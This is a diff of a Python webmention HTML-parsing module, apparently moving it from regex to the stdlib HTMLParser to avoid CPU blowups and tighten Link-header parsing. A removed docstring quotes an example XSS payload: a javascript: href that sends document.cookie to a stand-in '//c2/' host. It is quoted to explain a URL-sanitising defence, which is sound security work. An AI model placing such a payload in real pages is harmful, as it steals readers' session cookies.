@@ -1,100 +1,130 @@
-"""HTML parsing helpers for webmention discovery + verification.
+"""HTML parsing for webmention links, endpoint discovery and author metadata.
 
-Three functions:
-
-- `extract_links(html, base_url)`: every `<a href="...">` URL in
-  the body, resolved against `base_url`. Used by the outbox
-  scanner to find candidate targets.
-- `find_endpoint(html, headers, base_url)`: webmention endpoint
-  per W3C §3.1.2 discovery order: `Link:` HTTP header first,
-  then `<link rel="webmention">` / `<a rel="webmention">` in HTML.
-- `extract_hcard(html, base_url)`: best-effort h-card extractor
-  for `(name, url, photo)`. A minimal regex pass that handles
-  the common shape (`<a class="h-card">Name</a>` and similar);
-  full microformats parsing is deferred per the issue's "h-card
-  -only subset" note.
-
-Regex-based on purpose: pulling BeautifulSoup or lxml just for
-these three small parses would inflate the dep surface. The
-patterns aren't perfectly robust against pathological input, but
-the contracts they implement (link discovery, endpoint
-discovery, h-card extraction) are tolerant of misses, so a
-missing h-card just means the source URL is shown verbatim.
+Use the stdlib parser on the complete, size-capped document. Repeated regex
+searches over malformed HTML can consume quadratic CPU on the public inbox.
+The h-card support remains a small subset of microformats2.
 """
 
 from __future__ import annotations
 
-import re
 from collections.abc import Iterable
+from html.parser import HTMLParser
 from urllib.parse import urljoin, urlparse
+
+from werkzeug.http import parse_options_header
 
 from bragi.core.safe_urls import safe_external_url
 
-# Matches `<a href="..." ...>` with single or double quotes.
-_HREF_RE = re.compile(r"""<a\s[^>]*href\s*=\s*(["'])(?P<url>[^"']+)\1""", re.IGNORECASE)
 
-# `<link rel="webmention" href="...">` (any element with the rel
-# attribute counts per spec, but in practice the source is `link`
-# in `<head>` or an `a` in body).
-_REL_WEBMENTION_RE = re.compile(
-    r"""<(?:link|a)\s[^>]*rel\s*=\s*(["'])[^"']*\bwebmention\b[^"']*\1[^>]*href\s*=\s*(["'])(?P<url>[^"']+)\2"""
-    r"""|<(?:link|a)\s[^>]*href\s*=\s*(["'])(?P<url2>[^"']+)\3[^>]*rel\s*=\s*(["'])[^"']*\bwebmention\b[^"']*\5""",
-    re.IGNORECASE,
-)
+def _resolve_url(base_url: str, raw: str) -> str | None:
+    try:
+        return safe_external_url(urljoin(base_url, raw))
+    except ValueError:
+        return None
 
-# Single h-card: typically `<a class="..h-card..." href="..">Name</a>`.
-_HCARD_RE = re.compile(
-    r"""<a\s[^>]*class\s*=\s*(["'])(?P<cls>[^"']*\bh-card\b[^"']*)\1[^>]*href\s*=\s*(["'])(?P<url>[^"']+)\3[^>]*>(?P<name>[^<]*)</a>""",
-    re.IGNORECASE,
-)
-_U_PHOTO_RE = re.compile(
-    r"""<img\s[^>]*class\s*=\s*(["'])[^"']*\bu-photo\b[^"']*\1[^>]*src\s*=\s*(["'])(?P<url>[^"']+)\2""",
-    re.IGNORECASE,
-)
 
-# Mention-type marker classes, in W3C-priority order. First match wins.
-_MENTION_TYPE_RE = re.compile(
-    r"""class\s*=\s*(["'])(?P<cls>[^"']*\b(in-reply-to|like-of|repost-of|bookmark-of)\b[^"']*)\1""",
-    re.IGNORECASE,
-)
+class _MentionHTML(HTMLParser):
+    def __init__(self, base_url: str) -> None:
+        super().__init__(convert_charrefs=True)
+        self.base_url = base_url
+        self.links: list[str] = []
+        self._seen_links: set[str] = set()
+        self.endpoint: str | None = None
+        self.mention_type = "mention"
+        self._card: tuple[str | None, str | None] | None = None
+        self._name_parts: list[str] | None = None
+        self._card_url: str | None = None
+        self._photo: str | None = None
+        self._text: list[str] = []
+        self._raw_text_tag: str | None = None
 
-# `Link: <url>; rel="webmention"` (or variants with whitespace and
-# extra params). Multiple Link values may be comma-separated.
-_LINK_HEADER_RE = re.compile(
-    r"""<(?P<url>[^>]+)>\s*;[^,]*\brel\s*=\s*(?:["']?)[^"',]*\bwebmention\b""",
-    re.IGNORECASE,
-)
+    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        if self._raw_text_tag is not None:
+            return
+        if tag in {"script", "style"}:
+            self._raw_text_tag = tag
+            return
+        self._text.append(" ")
+        attributes = dict(attrs)
+        classes = set((attributes.get("class") or "").lower().split())
+        if self.mention_type == "mention":
+            for kind in ("in-reply-to", "repost-of", "like-of", "bookmark-of"):
+                if kind in classes or f"u-{kind}" in classes:
+                    self.mention_type = kind
+                    break
+        href = (attributes.get("href") or "").strip()
+        if tag in {"a", "link"} and self.endpoint is None:
+            relations = (attributes.get("rel") or "").lower().split()
+            if href and "webmention" in relations:
+                self.endpoint = _resolve_url(self.base_url, href)
+        if tag == "a":
+            if href and not href.startswith("#"):
+                url = _resolve_url(self.base_url, href)
+                if url and url not in self._seen_links:
+                    self._seen_links.add(url)
+                    self.links.append(url)
+            if self._card is None:
+                # A new anchor also ends an unfinished candidate h-card.
+                self._name_parts = [] if href and "h-card" in classes else None
+                self._card_url = _resolve_url(self.base_url, href) if href else None
+        if tag == "img" and "u-photo" in classes and self._photo is None:
+            src = attributes.get("src")
+            if src:
+                self._photo = _resolve_url(self.base_url, src)
+
+    def handle_data(self, data: str) -> None:
+        if self._raw_text_tag is not None:
+            return
+        self._text.append(data)
+        if self._name_parts is not None:
+            self._name_parts.append(data)
+
+    def handle_endtag(self, tag: str) -> None:
+        if self._raw_text_tag is not None:
+            if tag == self._raw_text_tag:
+                self._raw_text_tag = None
+            return
+        self._text.append(" ")
+        if tag == "a" and self._name_parts is not None:
+            name = " ".join("".join(self._name_parts).split()) or None
+            self._card = (name, self._card_url)
+            self._name_parts = None
+
+    @property
+    def hcard(self) -> tuple[str | None, str | None, str | None]:
+        if self._card is None:
+            return None, None, None
+        return self._card[0], self._card[1], self._photo
+
+    @property
+    def snippet(self) -> str | None:
+        return " ".join("".join(self._text).split())[:280] or None
+
+    def links_to_target(self, target_url: str) -> bool:
+        target = _strip_fragment(target_url)
+        return any(_strip_fragment(url) == target for url in self.links)
+
+
+def parse_html(html: str, base_url: str = "") -> _MentionHTML:
+    """Parse one source document, ignoring markup in comments and raw text."""
+    parser = _MentionHTML(base_url)
+    try:
+        parser.feed(html)
+        parser.close()
+    except ValueError:
+        # Overlong decimal character references exceed Python's integer limit.
+        # Discard partial results so earlier links cannot verify a failed parse.
+        return _MentionHTML(base_url)
+    return parser
 
 
 def extract_links(html: str, base_url: str) -> list[str]:
-    """Every absolute `<a href>` URL in the rendered body.
-
-    Relative hrefs are resolved against `base_url`. Duplicates
-    are de-duped while preserving first-seen order.
-    """
-    seen: set[str] = set()
-    out: list[str] = []
-    for match in _HREF_RE.finditer(html):
-        raw = match.group("url").strip()
-        if not raw or raw.startswith(("#", "mailto:", "javascript:", "tel:")):
-            continue
-        resolved = urljoin(base_url, raw)
-        if resolved not in seen:
-            seen.add(resolved)
-            out.append(resolved)
-    return out
+    """Resolved HTTP(S) anchor URLs, deduplicated in first-seen order."""
+    return parse_html(html, base_url).links
 
 
 def is_external(url: str, our_host: str) -> bool:
-    """True when `url` points to a host other than `our_host`.
-
-    Same-host links don't generate webmentions (a site doesn't
-    mention itself). Comparison is on `hostname`, not `netloc`:
-    `netloc` includes port and userinfo, so an explicit port on
-    one side (`example.com:443`) would never match a hostname
-    derived from `Site.hostname` (no port). Comparison is
-    case-insensitive.
-    """
+    """Compare hostnames without ports or userinfo, case-insensitively."""
     try:
         parsed = urlparse(url)
     except ValueError:
@@ -104,97 +134,76 @@ def is_external(url: str, our_host: str) -> bool:
     return parsed.hostname.lower() != (our_host or "").lower()
 
 
+def _split_link_header(header: str, delimiter: str = ",") -> Iterable[str]:
+    """Split Link values or parameters outside quotes and URI targets."""
+    start = 0
+    quoted = in_uri = escaped = False
+    for index, char in enumerate(header):
+        if in_uri:
+            if char == ">":
+                in_uri = False
+        elif quoted:
+            if escaped:
+                escaped = False
+            elif char == "\\":
+                escaped = True
+            elif char == '"':
+                quoted = False
+        elif char == "<":
+            in_uri = True
+        elif char == '"':
+            quoted = True
+        elif char == delimiter:
+            yield header[start:index].strip()
+            start = index + 1
+    yield header[start:].strip()
+
+
 def find_endpoint(
     headers: dict[str, str] | Iterable[tuple[str, str]], html: str, base_url: str
 ) -> str | None:
-    """Return the discovered webmention endpoint or None.
-
-    Per W3C §3.1.2 discovery order: `Link` HTTP header first
-    (more authoritative; cheaper for senders since the server
-    can answer with just a HEAD), then `<link rel="webmention">`
-    / `<a rel="webmention">` in the body.
-    """
-    if isinstance(headers, dict):
-        link_header = headers.get("Link") or headers.get("link") or ""
-    else:
-        link_header = ""
-        for k, v in headers:
-            if k.lower() == "link":
-                link_header = v
-                break
-    if link_header:
-        for piece in link_header.split(","):
-            match = _LINK_HEADER_RE.search(piece)
-            if match:
-                return str(urljoin(base_url, match.group("url").strip()))
-    match = _REL_WEBMENTION_RE.search(html)
-    if match:
-        url = match.group("url") or match.group("url2") or ""
-        if url:
-            return str(urljoin(base_url, url))
-    return None
+    """Discover a webmention endpoint from Link headers before HTML."""
+    items = headers.items() if isinstance(headers, dict) else headers
+    link_header = next((value for key, value in items if key.lower() == "link"), "")
+    for value in _split_link_header(link_header):
+        if not value.startswith("<"):
+            continue
+        target, separator, parameters = value[1:].partition(">")
+        if not separator or not target.strip():
+            continue
+        for parameter in _split_link_header(parameters, delimiter=";"):
+            key, _, relation = parameter.partition("=")
+            if key.strip().lower() != "rel":
+                continue
+            # Link permits whitespace around "="; MIME parameter parsing does not.
+            _, options = parse_options_header("link; rel=" + relation.strip())
+            if "webmention" in options.get("rel", "").lower().split():
+                endpoint = _resolve_url(base_url, target.strip())
+                if endpoint:
+                    return endpoint
+            break  # RFC 8288: only the first rel parameter applies.
+    return parse_html(html, base_url).endpoint
 
 
 def source_links_to_target(html: str, source_url: str, target_url: str) -> bool:
-    """True when `html` contains at least one `<a href>` resolving to `target_url`.
-
-    Per W3C Webmention §3.2.1 the inbox MUST verify this before
-    accepting a mention. We resolve relative hrefs against
-    `source_url` and compare URL strings after stripping the
-    fragment (fragments don't affect identity for verification).
-    """
-    target_clean = _strip_fragment(target_url)
-    return any(_strip_fragment(href) == target_clean for href in extract_links(html, source_url))
+    """Verify an anchor links to the target, ignoring URL fragments."""
+    return parse_html(html, source_url).links_to_target(target_url)
 
 
 def _strip_fragment(url: str) -> str:
-    """Drop the `#fragment` part of a URL for comparison."""
     return url.split("#", 1)[0]
 
 
 def extract_hcard(html: str, base_url: str) -> tuple[str | None, str | None, str | None]:
-    """Return `(author_name, author_url, author_photo)` from h-card.
+    """Return the first anchor h-card's name, safe author URL and safe photo.
 
-    Returns three `None`s when nothing matched. The regex is a
-    pragmatic match for the dominant h-card shape (a single `<a
-    class="h-card" href="...">Name</a>` plus optional
-    `<img class="u-photo" src="...">`); the full mf2 spec needs
-    a real parser.
-
-    `author_url` and `author_photo` are gated through
-    `safe_external_url` (from `bragi.core.safe_urls`) so an
-    attacker-controlled source page that advertises an
-    `<a class="h-card" href="javascript:fetch('//c2/'+document.cookie)">`
-    can't smuggle a `javascript:` URL into `Webmention.author_url`.
-    Once a moderator approves the row, that URL renders as an
-    `<a href>` on the public post; clicking it would execute
-    attacker JS in the delivery origin (where a logged-in reader's
-    session cookies live). The admin moderation list shows the URL
-    as truncated plain text, so a moderator can't easily preview
-    the trap. Gate at extraction time so this is a one-line
-    defence rather than a render-time concern. The same helper
-    also rejects Unicode bidi-formatting codepoints (RLO and
-    friends) that would flip the URL's visual order in the
-    moderation list, fooling a moderator into approving a row
-    whose real destination is malicious.
+    Author URLs and photos still pass the HTTP(S) scheme and control-character
+    checks before storage, because template escaping alone cannot make a
+    javascript URL safe.
     """
-    match = _HCARD_RE.search(html)
-    if match is None:
-        return (None, None, None)
-    name = (match.group("name") or "").strip() or None
-    url = safe_external_url(urljoin(base_url, match.group("url"))) if match.group("url") else None
-    photo_match = _U_PHOTO_RE.search(html)
-    photo = safe_external_url(urljoin(base_url, photo_match.group("url"))) if photo_match else None
-    return (name, url, photo)
+    return parse_html(html, base_url).hcard
 
 
 def classify_mention(html: str) -> str:
-    """Pick the most specific mention class on the page, or "mention"."""
-    match = _MENTION_TYPE_RE.search(html)
-    if match is None:
-        return "mention"
-    cls = match.group("cls").lower()
-    for kind in ("in-reply-to", "repost-of", "like-of", "bookmark-of"):
-        if kind in cls:
-            return kind
-    return "mention"
+    """Pick the first recognized mention class, or the generic mention type."""
+    return parse_html(html).mention_type
